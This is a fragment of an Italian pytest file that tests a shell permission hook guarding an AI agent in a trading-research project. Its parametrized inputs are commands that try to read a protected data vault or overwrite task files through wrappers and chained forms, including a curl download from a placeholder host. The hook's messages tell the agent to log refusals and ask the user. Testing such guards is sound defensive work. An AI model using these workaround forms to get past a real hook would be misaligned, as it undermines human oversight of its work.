    f"cat research/data/vault/AAVEUSDT/x.zip {_TASKS}",
    f"git log origin/research/campagna/AAVEUSDT > {_TASKS}",
    f"cat research/campagne/AAVEUSDT/log.jsonl # {_TASKS}",
    f"cat research/campagne/AAVEUSDT/log.jsonl # {_TOOL_RESULTS}",
    f"sh -c 'curl https://example.com/x > {_TASKS}'",
    # le altre forme autonome si cercano solo nel motivo: qui il motivo e' il vault
    "echo shallow; cat research/data/vault/AAVEUSDT/x.zip",
    "cat research/data/vault/AAVEUSDT/x.zip > research/data/insample/GRUPPO/x.txt",
    f"echo {g._FORMA_SILENZIOSA}; cat research/data/vault/AAVEUSDT/x.zip",
])
def test_M_un_rifiuto_per_un_altro_motivo_chiede_ancora_all_utente(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    _rifiutato((codice, errore))
    assert errore.rstrip("\n").endswith("Registra il rifiuto nel log e chiedi all'utente."), errore
    assert "lavoro/<nome>.out" not in errore and "non serve chiedere" not in errore, errore


@pytest.mark.parametrize("comando", [
    f"sh -c 'cat {_TASKS}'",
    f"cat {_TASKS} 2>&1 | tail",
    f"cat {_TASKS} research/data/vault/AAVEUSDT/x.zip",   # il primo percorso rifiutato e' il file d'uscita
    f"grep -c passed {_TOOL_RESULTS}",
])
def test_M_il_file_d_uscita_rifiutato_anche_in_altre_forme_indica_la_redirezione(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    _rifiutato((codice, errore))
    assert f"{_LAVORO}/<nome>.out e .err" in errore and "non serve chiedere all'utente" in errore, errore


def test_M_con_una_moneta_sola_le_forme_autonome_si_cercano_nel_motivo(tmp_path_factory):
    radice = _radice_sol(tmp_path_factory)
    codice, errore = _bash(radice, "echo shallow; cat research/data/vault/SOLUSDT/x.zip")
    _rifiutato((codice, errore), "sessione campagna SOLUSDT")
    assert errore.rstrip("\n").endswith("Registra il rifiuto nel log e chiedi all'utente."), errore
